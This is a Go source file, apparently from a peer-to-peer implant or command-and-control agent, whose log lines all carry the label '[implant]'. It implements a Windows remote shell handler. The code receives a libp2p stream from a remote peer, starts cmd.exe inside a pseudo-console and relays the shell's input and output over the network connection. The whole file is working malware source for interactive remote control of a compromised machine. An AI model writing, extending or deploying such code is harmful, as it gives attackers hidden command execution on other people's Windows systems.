//go:build windows

package core

import (
	"encoding/binary"
	"io"
	"log"
	"unsafe"

	"github.com/libp2p/go-libp2p/core/network"
	"golang.org/x/sys/windows"
)

type pipeHandle struct {
	h windows.Handle
}

func (p *pipeHandle) Read(b []byte) (int, error) {
	var n uint32
	err := windows.ReadFile(p.h, b, &n, nil)
	return int(n), err
}

func (p *pipeHandle) Write(b []byte) (int, error) {
	var n uint32
	err := windows.WriteFile(p.h, b, &n, nil)
	return int(n), err
}

func (p *pipeHandle) Close() error {
	return windows.CloseHandle(p.h)
}

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	var rows, cols uint16
	if err := binary.Read(s, binary.LittleEndian, &rows); err != nil {
		log.Printf("[implant] read shell rows: %v", err)
		return
	}
	if err := binary.Read(s, binary.LittleEndian, &cols); err != nil {
		log.Printf("[implant] read shell cols: %v", err)
		return
	}
	if rows < 10 || cols < 10 {
		rows = 30
		cols = 120
	}

	var hPtyIn, hCmdIn windows.Handle
	var hCmdOut, hPtyOut windows.Handle
	if err := windows.CreatePipe(&hPtyIn, &hCmdIn, nil, 0); err != nil {
		log.Printf("[implant] pipe in: %v", err)
		return
	}
	if err := windows.CreatePipe(&hCmdOut, &hPtyOut, nil, 0); err != nil {
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		log.Printf("[implant] pipe out: %v", err)
		return
	}

	var hPC windows.Handle
	if err := windows.CreatePseudoConsole(
		windows.Coord{X: int16(cols), Y: int16(rows)},
		hPtyIn, hPtyOut, 0, &hPC,
	); err != nil {
		log.Printf("[implant] create pty: %v", err)
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	attrList, err := windows.NewProcThreadAttributeList(1)
	if err != nil {
		log.Printf("[implant] attr list: %v", err)
		windows.ClosePseudoConsole(hPC)
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}
	defer attrList.Delete()

	if err := attrList.Update(
		windows.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
		unsafe.Pointer(&hPC),
		unsafe.Sizeof(hPC),
	); err != nil {
		log.Printf("[implant] update attr: %v", err)
		windows.ClosePseudoConsole(hPC)
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	cmdW, err := windows.UTF16PtrFromString("cmd.exe")
	if err != nil {
		windows.ClosePseudoConsole(hPC)
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	si := windows.StartupInfoEx{}
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfoEx{}))
	// ConPTY handles the stdio — no STARTF_USESTDHANDLES needed
	si.ProcThreadAttributeList = attrList.List()

	pi := new(windows.ProcessInformation)
	err = windows.CreateProcess(
		nil, cmdW,
		nil, nil,
		false,
		windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_UNICODE_ENVIRONMENT,
		nil, nil,
		&si.StartupInfo,
		pi,
	)
	if err != nil {
		log.Printf("[implant] create process: %v", err)
		windows.ClosePseudoConsole(hPC)
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	windows.CloseHandle(pi.Thread)
	log.Printf("[implant] shell started via ConPTY for %s", remotePeer.String())

	// hPtyIn and hPtyOut are owned by the ConPTY — do NOT close them until ClosePseudoConsole
	inPipe := &pipeHandle{h: hCmdIn}
	outPipe := &pipeHandle{h: hCmdOut}

	done := make(chan struct{}, 2)

	go func() {
		io.Copy(inPipe, s)
		inPipe.Close()
		windows.ClosePseudoConsole(hPC)
		done <- struct{}{}
	}()

	go func() {
		io.Copy(s, outPipe)
		outPipe.Close()
		done <- struct{}{}
	}()

	<-done
	windows.ClosePseudoConsole(hPC)
	s.Close()

	<-done

	windows.WaitForSingleObject(pi.Process, 5000)
	windows.CloseHandle(pi.Process)

	log.Printf("[implant] shell ended for %s", remotePeer.String())
}
